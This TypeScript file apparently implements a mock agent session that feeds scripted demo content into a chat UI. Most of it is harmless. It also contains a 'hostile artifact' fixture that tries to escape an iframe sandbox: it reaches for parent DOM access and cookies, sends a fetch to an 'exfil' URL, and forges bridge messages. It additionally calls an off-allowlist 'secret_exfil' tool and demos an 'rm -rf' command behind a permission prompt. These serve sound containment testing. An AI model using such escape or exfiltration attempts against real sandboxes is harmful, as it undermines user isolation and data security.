import { randomUUID } from "node:crypto";
import type { WireMsg } from "../protocol";
import {
  type AgentSession,
  type TodoItem,
  capOutput,
  PERMISSION_TIMEOUT_MS,
} from "./types";

// ---------------------------------------------------------------------------
// Mock content — five demo "personas", drawn from a shuffled deck with
// randomized details so an API-free demo feels varied. Agent-neutral: the
// mock is a dev stand-in for any adapter that lacks credentials, not a fake
// of any particular agent.
// ---------------------------------------------------------------------------

const pick = <T,>(arr: readonly T[]): T => arr[Math.floor(Math.random() * arr.length)];
const randInt = (lo: number, hi: number) => lo + Math.floor(Math.random() * (hi - lo + 1));
const spark = (n = 14) =>
  Array.from({ length: n }, () => "▁▂▃▄▅▆▇█"[randInt(0, 7)]).join("");
const shuffled = <T,>(arr: readonly T[]): T[] =>
  [...arr].sort(() => Math.random() - 0.5);

const PROJECTS = ["aurora", "helios", "quasar", "meridian", "lattice", "voyager"] as const;
const SERVICES = ["api-gateway", "auth", "billing", "search", "ingest", "renderer", "scheduler"] as const;
const FILES = ["server/session.ts", "web/src/RenderZone.tsx", "lib/cache.ts", "worker/queue.ts"] as const;
const TOPICS = [
  "local-first sync engines",
  "WebGPU compute pipelines",
  "prompt-caching economics",
  "CRDT merge strategies",
] as const;
// Mock tool calls (Phase T.1): each yields a full use→result pair so the
// transcript's tool blocks are exercised API-free; the last one is an error.
const MOCK_TOOLS: (() => {
  name: string;
  detail: string;
  output: string;
  isError?: boolean;
  input?: Record<string, unknown>;
})[] = [
  () => ({
    name: "Edit",
    detail: pick(FILES),
    input: {
      file_path: pick(FILES),
      old_string:
        "export function retry(fn, times) {\n  for (let i = 0; i < times; i++) {\n    return fn();\n  }\n}",
      new_string:
        "export async function retry(fn, times) {\n  let lastErr;\n  for (let i = 0; i < times; i++) {\n    try {\n      return await fn();\n    } catch (err) {\n      lastErr = err;\n    }\n  }\n  throw lastErr;\n}",
    },
    output: `Updated 1 occurrence`,
  }),
  () => ({
    name: "Write",
    detail: pick(FILES),
    input: {
      file_path: pick(FILES),
      content: `import { retry } from "./retry";\n\nexport const fetchStats = () =>\n  retry(() => fetch("/api/stats").then((r) => r.json()), 3);\n`,
    },
    output: "File created",
  }),
  () => ({
    name: "Bash",
    detail: "ls -la src/",
    output: [
      `total ${randInt(24, 96)}`,
      ...shuffled(FILES)
        .slice(0, 3)
        .map(
          (f) =>
            `-rw-r--r--  1 dev dev  ${randInt(1, 9)}${randInt(100, 999)} Jul  4 1${randInt(0, 9)}:${randInt(10, 59)} ${f.split("/").pop()}`,
        ),
    ].join("\n"),
  }),
  () => ({
    name: "Grep",
    detail: `-rn "TODO" ${pick(FILES).split("/")[0]}/`,
    output: shuffled(FILES)
      .slice(0, 3)
      .map((f) => `${f}:${randInt(10, 240)}: // TODO: ${sentence().toLowerCase()}`)
      .join("\n"),
  }),
  () => ({
    name: "Read",
    detail: pick(FILES),
    output: Array.from({ length: 5 }, (_, i) => `${i + 1}→${pick(SENTENCES)}`).join("\n"),
  }),
  () => ({
    name: "Bash",
    detail: "yarn test --run",
    output: `$ vitest run
✗ ${pick(SERVICES)} › invalidates the cache on write
  AssertionError: expected 2 to be 1
    at ${pick(FILES)}:${randInt(20, 200)}:${randInt(2, 40)}
Tests: 1 failed, ${randInt(8, 30)} passed`,
    isError: true,
  }),
];
const SENTENCES = [
  "The hot path allocates on every call, which dominates the flame graph.",
  "Cache locality, not algorithmic complexity, explains most of the variance.",
  "Retry storms amplify tail latency far more than raw throughput suggests.",
  "The write path fans out to three consumers, only one of which is critical.",
  "Batching at the boundary removes 80% of the round trips for free.",
  "Most of the cost is serialization, not the network itself.",
  "The failure mode is silent degradation rather than a clean crash.",
  "Backpressure is absorbed at the queue, so upstream never notices.",
] as const;
const sentence = () => pick(SENTENCES);

const welcomeTemplate = (prompt: string) => `## Demo session

You said: **${prompt}**

This agent has no credentials, so a scripted demo reply is exercising the
rendering pipeline — nothing here came from a real agent.

- Streaming text deltas ✓
- Markdown with [a safe link](https://example.com) ✓
- Fenced code:

\`\`\`ts
export type WireMsg = { type: "text_delta"; text: string };
\`\`\`

| feature | status |
| --- | --- |
| tables | render |
| links | open in new tab |

To go live, connect your agent's credentials (see the demo banner above) and
restart Mirafold.`;

const analyticsTemplate = () => {
  const project = pick(PROJECTS);
  const rows = shuffled(SERVICES)
    .slice(0, randInt(4, 5))
    .map(
      (svc) =>
        `| \`${svc}\` | ${randInt(8, 40)}ms | ${randInt(60, 240)}ms | 0.0${randInt(1, 9)}% | ${pick(["▲", "▼"])} ${randInt(1, 12)}% |`,
    )
    .join("\n");
  return `## ⚡ Weekly performance — \`${project}\`

**Uptime:** 99.9${randInt(0, 9)}% · **Deploys:** ${randInt(3, 24)} · **MTTR:** ${randInt(4, 40)}m

| service | p50 | p99 | error rate | trend |
| --- | --- | --- | --- | --- |
${rows}

\`\`\`
requests  ${spark()}
errors    ${spark()}
latency   ${spark()}
\`\`\`

> 🔎 **Insight:** ${sentence()}

**Recommended next steps**

1. ${sentence()}
2. ${sentence()}
3. Re-run the load test and compare against [last week's baseline](https://example.com/baseline).`;
};

const codeReviewTemplate = () => {
  const file = pick(FILES);
  return `## Code review: \`${file}\`

Found **${randInt(2, 5)} issues** across ${randInt(1, 4)} files. ${sentence()}

### 🔴 Blocking — race in cache invalidation

\`\`\`diff
- const cached = this.cache.get(key);
- if (cached) return cached;
+ const cached = await this.cache.getOrLock(key);
+ if (cached !== undefined) return cached;
\`\`\`

### 🟡 Suggestion — hoist the invariant

\`\`\`ts
const root = path.resolve(workspaceDir); // compute once, not per call
export const isInside = (p: string) => p.startsWith(root + path.sep);
\`\`\`

> ${sentence()}

**Fix checklist**

- [x] Reproduce under load
- [ ] Patch the lock acquisition
- [ ] Add a regression test
- [ ] Backport to \`release/${randInt(1, 3)}.${randInt(0, 9)}\``;
};

const planTemplate = () => {
  const project = pick(PROJECTS);
  return `## Migration plan: \`${project}\` → workers

> **Goal:** ${sentence()}

### Phase 1 — extract the seam
- [x] Freeze the public interface
- [x] Add contract tests
- [ ] Route ${randInt(5, 25)}% of traffic through the shim

### Phase 2 — cut over
- [ ] Dual-write for ${randInt(2, 7)} days
- [ ] Compare checksums, then flip the read path

| risk | owner | mitigation |
| --- | --- | --- |
| replay divergence | @core | checksum audit job |
| queue backlog | @infra | autoscale at ${randInt(60, 85)}% |
| stale cache | @web | TTL drop to ${randInt(1, 10)}m |

**ETA:** ${randInt(2, 6)} weeks. ${sentence()}`;
};

const researchTemplate = () => {
  const topic = pick(TOPICS);
  return `## Research brief: ${topic}

**TL;DR:** ${sentence()}

### Findings

1. **Adoption is uneven.** ${sentence()}
2. **The bottleneck moved.** ${sentence()}
3. **Tooling is the moat.** ${sentence()}

> "${sentence()}" — [primary source](https://example.com/paper)

| source | type | relevance |
| --- | --- | --- |
| [Systems survey](https://example.com/survey) | paper | high |
| [Field notes](https://example.com/notes) | blog | medium |
| [Benchmark repo](https://example.com/bench) | code | high |

*Confidence: ${pick(["low", "medium", "high"])} — based on ${randInt(4, 12)} sources.*`;
};

const TEMPLATES: ((prompt: string) => string)[] = [
  welcomeTemplate,
  analyticsTemplate,
  codeReviewTemplate,
  planTemplate,
  researchTemplate,
];

// Sample `render` payloads (mock-first: the render flow works API-free).
// Props must satisfy the registry spec — validated by the 1.2 smoke test.
export const MOCK_RENDERS: (() => { component: string; props: Record<string, unknown> })[] = [
  () => ({
    component: "card",
    props: {
      title: `Deploy verdict: ${pick(PROJECTS)}`,
      body: `**Ship it.** ${sentence()}`,
      footer: `mock render · ${new Date().toLocaleTimeString()}`,
    },
  }),
  () => ({
    component: "list",
    props: {
      title: "Follow-ups",
      ordered: true,
      items: [
        { text: sentence() },
        { text: sentence(), detail: `owner: @${pick(SERVICES)}` },
        { text: sentence() },
      ],
    },
  }),
  () => ({
    component: "table",
    props: {
      title: `Hot paths — \`${pick(PROJECTS)}\``,
      columns: ["service", "p99 (ms)", "calls/min"],
      rows: shuffled(SERVICES)
        .slice(0, 3)
        .map((svc) => [`\`${svc}\``, randInt(60, 240), randInt(200, 9000)]),
    },
  }),
  () => ({
    component: "chart",
    props: {
      title: `p99 latency — ${pick(PROJECTS)}`,
      kind: pick(["line", "bar"] as const),
      x: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
      yLabel: "ms",
      series: shuffled(SERVICES)
        .slice(0, randInt(1, 3))
        .map((svc) => ({
          name: svc,
          values: Array.from({ length: 7 }, () => randInt(40, 240)),
        })),
    },
  }),
  () => ({
    component: "link-group",
    props: {
      title: "Sources",
      links: [
        { label: "Systems survey", href: "https://example.com/survey", description: "paper" },
        { label: "Benchmark repo", href: "https://example.com/bench" },
      ],
    },
  }),
];

// The hostile-artifact fixture. Each escape attempt writes its outcome
// into the artifact's own DOM (the one place it CAN write), so a browser test
// reads containment results through the frame. It also fires the bridge
// abuses whose proof is a NON-event in the transcript: forged/unstamped
// postMessages and an action burst against the rate limit (R.4e).
const HOSTILE_ARTIFACT =
  "<h2>hostile artifact</h2>" +
  '<div id="dom">pending</div>' +
  '<div id="cookie">pending</div>' +
  '<div id="csp">pending</div>' +
  '<div id="sent">pending</div>' +
  "<script>" +
  "var set=function(id,v){document.getElementById(id).textContent=v};" +
  // Escape 1: the shell's DOM — must be structurally unreachable.
  "try{void parent.document;set('dom','PARENT-DOM-REACHED')}catch(e){set('dom','parent-dom-blocked')}" +
  // Escape 2: app-origin storage — opaque origin must throw.
  "try{void document.cookie;set('cookie','COOKIE-REACHED')}catch(e){set('cookie','cookie-blocked')}" +
  // Escape 3: network exfiltration — the injected CSP must block fetch.
  "document.addEventListener('securitypolicyviolation',function(e){set('csp','csp-violation:'+(e.effectiveDirective||e.violatedDirective))});" +
  "try{fetch('https://example.com/exfil').then(function(){set('csp','FETCH-SUCCEEDED')},function(){})}catch(e){}" +
  // Escape 4: forged bridge messages — unstamped and wrong-nonce state op.
  "try{parent.postMessage({mirafold:1,action:{kind:'prompt',text:'forged-unstamped-prompt'}},'*')}catch(e){}" +
  "try{parent.postMessage({mirafold:1,nonce:'guessed',action:{kind:'state',op:'set',key:'x',value:'y'}},'*')}catch(e){}" +
  // Escape 5: an action burst — the 400ms rate limit must drop the second.
  "mirafold.prompt('burst-alpha');mirafold.prompt('burst-beta');" +
  "set('sent','attacks-sent');" +
  "</script>";

/**
 * Stand-in session for API-free development: emits a scripted WireMsg
 * stream that covers every Phase 0 message type. Replies are drawn from
 * a shuffled deck of five templates so no template repeats until all
 * five have been seen.
 */
export class MockSession implements AgentSession {
  private listeners = new Set<(msg: WireMsg) => void>();
  private timers: ReturnType<typeof setTimeout>[] = [];
  private deck: number[] = [];
  private pendingAsks = new Map<string, (allow: boolean) => void>();

  get modelName(): string {
    return "mock-sonnet";
  }

  // Each deterministic hook exercises one UI capability API-free; anything
  // else is a canned reply drawn from the template deck.
  pushPrompt(text: string) {
    if (/interactive|button/i.test(text)) return this.playActionCard();
    if (/todo|checklist|step by step|plan it/i.test(text)) return this.playChecklist();
    if (/subagent|delegate/i.test(text)) return this.playSubagent();
    if (/huge|big output|large output|truncat/i.test(text)) return this.playHugeOutput();
    if (/artifact/i.test(text)) {
      // broken/navigating artifacts exercise the failure fallbacks (3.4).
      if (/broken|crash/i.test(text)) {
        return this.playArtifact(
          "broken demo",
          '<h2>about to crash</h2><script>throw new Error("deliberate mock crash")</script>',
        );
      }
      if (/navigat|escape/i.test(text)) {
        // about:blank triggers the same liveness kill as any external URL,
        // hermetically — the e2e containment test must not need the network.
        return this.playArtifact(
          "navigating demo",
          '<h2>leaving…</h2><script>location.href="about:blank"</script>',
        );
      }
      // An artifact that ATTEMPTS the escapes, reporting each result
      // into its own DOM so the e2e can assert containment from outside (R.4e).
      if (/hostile/i.test(text)) return this.playArtifact("hostile demo", HOSTILE_ARTIFACT);
      return this.playBridgeArtifact();
    }
    if (/dangerous|sudo|rm -rf/i.test(text)) return this.playPermissionAsk();
    this.playTemplateTurn(text);
  }

  /** Deterministic 2.2 hook: a card with action buttons so the
   *  click→action→turn loop runs API-free. */
  private playActionCard() {
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
    let delay = this.streamText("Here's the deploy control card — the buttons are live.", 350);
    delay += 350;
    this.schedule(
      () =>
        this.emit({
          type: "render",
          component: "card",
          props: {
            title: `Deploy status — ${pick(PROJECTS)}`,
            body: `**Healthy.** ${sentence()}`,
            footer: "mock render · actions attached",
            actions: [
              {
                label: "Explain more",
                action: { kind: "prompt", text: "Explain the current deploy status in more detail." },
              },
              {
                label: "List workspace",
                action: { kind: "tool", name: "workspace_ls" },
              },
            ],
          },
          id: randomUUID(),
        }),
      delay,
    );
    this.schedule(() => this.emit({ type: "turn_end" }), delay + 40);
  }

  /** Deterministic T2.5 hook: a live checklist — one render id, statuses
   *  progressing in place. */
  private playChecklist() {
    const rid = randomUUID();
    const items = [
      "Read the current implementation",
      "Draft the migration",
      "Update the tests",
      "Verify end to end",
    ];
    // active = index of the in_progress item; items before it are done.
    // active === items.length means every item is completed.
    const frame = (active: number): TodoItem[] =>
      items.map((content, i) => ({
        content,
        status: i < active ? "completed" : i === active ? "in_progress" : "pending",
      }));
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
    let d = 300;
    for (let active = 0; active <= items.length; active++) {
      const todos = frame(active);
      this.schedule(
        () => this.emit({ type: "render", component: "todo-list", props: { todos }, id: rid }),
        d,
      );
      d += 550;
    }
    d = this.streamText("Plan complete — all four steps done.", d + 100);
    this.schedule(() => this.emit({ type: "turn_end" }), d + 40);
  }

  /** Deterministic T2.4 hook: a Task whose inner tool calls nest under it
   *  (subagent text stays hidden). */
  private playSubagent() {
    const taskId = randomUUID();
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
    this.schedule(() => {
      this.emit({ type: "status", state: "tool", label: "Task" });
      this.emit({
        type: "tool_use",
        name: "Task",
        detail: "research: audit the config loader",
        id: taskId,
        input: { description: "audit config loader", subagent_type: "Explore" },
      });
    }, 350);
    // Subagent's inner calls — each tagged with the Task's id as parentId.
    const inner: { name: string; detail: string; output: string }[] = [
      { name: "Grep", detail: '-rn "loadConfig" src/', output: "src/config.ts:12: export function loadConfig(" },
      { name: "Read", detail: "src/config.ts", output: Array.from({ length: 4 }, (_, i) => `${i + 1}→${pick(SENTENCES)}`).join("\n") },
      { name: "Bash", detail: "node -e 'require(\"./config\")'", output: "config OK — 3 sources merged" },
    ];
    let d = 700;
    for (const t of inner) {
      const cid = randomUUID();
      d += randInt(250, 450);
      this.schedule(() => this.emit({ type: "tool_use", name: t.name, detail: t.detail, id: cid, parentId: taskId }), d);
      d += randInt(250, 450);
      this.schedule(() => this.emit({ type: "tool_result", output: t.output, id: cid, parentId: taskId }), d);
    }
    d += 300;
    this.schedule(
      () => this.emit({ type: "tool_result", output: "Audit complete: loader merges 3 sources; no precedence bug found.", id: taskId }),
      d,
    );
    d = this.streamText("The subagent audited the config loader — it merges three sources correctly, no precedence bug.", d + 200);
    this.schedule(() => this.emit({ type: "turn_end" }), d + 40);
  }

  /** Deterministic T2.3 hook: a tool whose output blows past the cap,
   *  exercising the elision marker. */
  private playHugeOutput() {
    const id = randomUUID();
    const bigLine = "2026-07-05T12:00:00Z  INFO  request served in 42ms — ok\n";
    const big = bigLine.repeat(2000); // ~110KB, well over the 64KB cap
    const capped = capOutput(big);
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
    this.schedule(() => {
      this.emit({ type: "status", state: "tool", label: "Bash" });
      this.emit({ type: "tool_use", name: "Bash", detail: "cat server.log", id });
    }, 400);
    this.schedule(
      () =>
        this.emit({
          type: "tool_result",
          output: capped.text,
          truncatedBytes: capped.truncatedBytes,
          id,
        }),
      900,
    );
    const d = this.streamText("That log is enormous — showing the head, the rest is elided.", 1100);
    this.schedule(() => this.emit({ type: "turn_end" }), d + 40);
  }

  /** Deterministic 3.2/3.3 hook: a small interactive artifact with bridge
   *  buttons (one allowlisted tool, one off-allowlist, one prompt) so
   *  sandbox + bridge run API-free. */
  private playBridgeArtifact() {
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
    let delay = this.streamText("No registry component fits this, so here's a sandboxed artifact — the buttons use the bridge.", 350);
    delay += 300;
    this.schedule(() => this.emit({ type: "status", state: "tool", label: "emit_artifact" }), delay);
    delay += 400;
    this.schedule(
      () =>
        this.emit({
          type: "artifact",
          title: "bridge demo",
          html:
            '<div style="text-align:center;padding:24px">' +
            '<h2 style="margin:0 0 12px">Counter</h2>' +
            '<button id="b" style="font-size:20px;padding:8px 24px;cursor:pointer">clicks: <span id="n">0</span></button>' +
            '<div style="margin-top:16px;display:flex;gap:8px;justify-content:center">' +
            '<button id="ls">list workspace</button>' +
            '<button id="evil">off-allowlist</button>' +
            '<button id="ask">ask for details</button>' +
            "</div>" +
            "<script>" +
            "let n=0;document.getElementById('b').onclick=()=>{document.getElementById('n').textContent=++n};" +
            "document.getElementById('ls').onclick=()=>mirafold.tool('workspace_ls');" +
            // Off-allowlist via the helper: must reach the server and be
            // rejected THERE (raw un-nonced postMessage dies client-side).
            "document.getElementById('evil').onclick=()=>mirafold.tool('secret_exfil');" +
            "document.getElementById('ask').onclick=()=>mirafold.prompt('Tell me more about this workspace.');" +
            "</script>" +
            "</div>",
          id: randomUUID(),
        }),
      delay,
    );
    this.schedule(() => this.emit({ type: "turn_end" }), delay + 40);
  }

  /** Deterministic T.3 hook: pause on a permission_request so the prompt bar
   *  is exercisable API-free. */
  private playPermissionAsk() {
    const id = randomUUID();
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
    this.schedule(() => {
      const timer = setTimeout(
        () => this.pendingAsks.get(id)?.(false),
        PERMISSION_TIMEOUT_MS,
      );
      this.timers.push(timer);
      this.pendingAsks.set(id, (allow) => {
        clearTimeout(timer);
        this.pendingAsks.delete(id);
        if (allow) this.playDangerousAllowed();
        else this.playDangerousDenied();
      });
      this.emit({
        type: "permission_request",
        tool: "Bash",
        detail: "rm -rf /var/cache/app && systemctl restart app",
        id,
      });
    }, 450);
  }

  /** A canned turn off the shuffled template deck: thinking, 1–2 tool
   *  use/result pairs, the streamed reply, one rendered component, usage. */
  private playTemplateTurn(text: string) {
    if (this.deck.length === 0) this.deck = shuffled(TEMPLATES.map((_, i) => i));
    const reply = TEMPLATES[this.deck.pop()!](text);

    let delay = 120;
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
    // A short scripted thought streams before the work starts (T2.1).
    const thought =
      "Reading the prompt again — the useful answer here is a quick check of " +
      "current state, then a compact summary with one component that fits the " +
      "data instead of a wall of prose. Gathering that first.";
    for (const chunk of thought.match(/.{1,18}/gs) ?? []) {
      delay += 11;
      this.schedule(() => this.emit({ type: "thinking_delta", text: chunk }), delay);
    }
    delay += 200;
    // Drawn without replacement — two identical tool rows in one turn read
    // as a rendering bug to a first-time viewer (R.4b).
    for (const factory of shuffled(MOCK_TOOLS).slice(0, randInt(1, 2))) {
      const t = factory();
      const id = randomUUID();
      delay += randInt(250, 550);
      this.schedule(() => {
        this.emit({ type: "status", state: "tool", label: t.name });
        this.emit({ type: "tool_use", name: t.name, detail: t.detail, id, input: t.input });
      }, delay);
      delay += randInt(300, 700);
      const capped = capOutput(t.output);
      this.schedule(
        () =>
          this.emit({
            type: "tool_result",
            output: capped.text,
            truncatedBytes: capped.truncatedBytes,
            isError: t.isError,
            id,
          }),
        delay,
      );
    }
    delay = this.streamText(reply, delay + 250, 12);
    // Every mock turn ends with a rendered component so the Phase 1 pipeline
    // is exercised without an API key.
    const { component, props } = pick(MOCK_RENDERS)();
    const label = `render_${component === "link-group" ? "links" : component}`;
    delay += 300;
    this.schedule(() => this.emit({ type: "status", state: "tool", label }), delay);
    delay += 400;
    this.schedule(
      () => this.emit({ type: "render", component, props, id: randomUUID() }),
      delay,
    );
    // Per-turn tokens so the meters run — but NO costUsd: a fabricated
    // dollar figure is the one number a demo viewer takes as real (R.4b;
    // omitted → the status bar shows no cost at all) (T2.6).
    const inTok = randInt(1800, 7200);
    const outTok = randInt(200, 900);
    this.schedule(
      () =>
        this.emit({
          type: "usage",
          model: "mock-sonnet",
          inputTokens: inTok,
          outputTokens: outTok,
        }),
      delay + 20,
    );
    this.schedule(() => this.emit({ type: "turn_end" }), delay + 40);
  }

  onMessage(cb: (msg: WireMsg) => void) {
    this.listeners.add(cb);
  }

  interrupt() {
    // Everything still scheduled belongs to the in-flight turn; abandoned
    // permission prompts die with it (deny by default).
    for (const t of this.timers) clearTimeout(t);
    this.timers = [];
    this.pendingAsks.clear();
    this.emit({ type: "turn_end" });
  }

  resolvePermission(id: string, allow: boolean) {
    this.pendingAsks.get(id)?.(allow);
  }

  close() {
    for (const t of this.timers) clearTimeout(t);
    this.timers = [];
    this.pendingAsks.clear();
  }

  /** Emit a one-artifact turn: brief text, then the artifact (Step 3.4 hooks). */
  private playArtifact(title: string, html: string) {
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
    let delay = this.streamText(`Here's the ${title} artifact.`, 300);
    delay += 250;
    this.schedule(() => this.emit({ type: "status", state: "tool", label: "emit_artifact" }), delay);
    delay += 350;
    this.schedule(() => this.emit({ type: "artifact", title, html, id: randomUUID() }), delay);
    this.schedule(() => this.emit({ type: "turn_end" }), delay + 40);
  }

  /** Continuation after the permission prompt was allowed: run the "command". */
  private playDangerousAllowed() {
    const id = randomUUID();
    this.schedule(() => {
      this.emit({ type: "status", state: "tool", label: "Bash" });
      this.emit({
        type: "tool_use",
        name: "Bash",
        detail: "rm -rf /var/cache/app && systemctl restart app",
        id,
      });
    }, 150);
    this.schedule(
      () =>
        this.emit({
          type: "tool_result",
          output: `removed ${randInt(80, 400)} files (${randInt(40, 900)} MB)\napp.service restarted — active (running)`,
          id,
        }),
      900,
    );
    const delay = this.streamText("Cache cleared and the service restarted cleanly. ✅", 1100);
    this.schedule(() => this.emit({ type: "turn_end" }), delay + 60);
  }

  /** Continuation after the permission prompt was denied (or timed out). */
  private playDangerousDenied() {
    const delay = this.streamText("Understood — I won't run that command. Nothing was changed.", 150);
    this.schedule(() => this.emit({ type: "turn_end" }), delay + 60);
  }

  private emit(msg: WireMsg) {
    for (const cb of this.listeners) cb(msg);
  }

  private schedule(fn: () => void, ms: number) {
    this.timers.push(setTimeout(fn, ms));
  }

  /** Schedule `text` as 16-char text_delta chunks, the first `per` ms after
   *  `from` and one every `per` ms; returns the delay cursor past the last. */
  private streamText(text: string, from: number, per = 14): number {
    let delay = from;
    for (const chunk of text.match(/.{1,16}/gs) ?? []) {
      delay += per;
      this.schedule(() => this.emit({ type: "text_delta", text: chunk }), delay);
    }
    return delay;
  }
}
